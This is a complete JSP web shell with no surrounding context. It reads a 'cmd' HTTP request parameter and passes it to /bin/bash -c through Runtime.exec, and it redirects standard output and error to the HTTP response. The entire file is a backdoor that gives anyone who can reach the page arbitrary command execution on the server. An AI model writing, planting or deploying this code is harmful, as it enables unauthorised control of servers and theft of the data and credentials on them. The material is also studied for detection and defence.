<%@page language="java" trimDirectiveWhitespaces="true"%><%
java.io.PrintStream ps = new java.io.PrintStream(response.getOutputStream());
java.lang.System.setOut(ps);
java.lang.System.setErr(ps);
Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",request.getParameter("cmd")});
 %>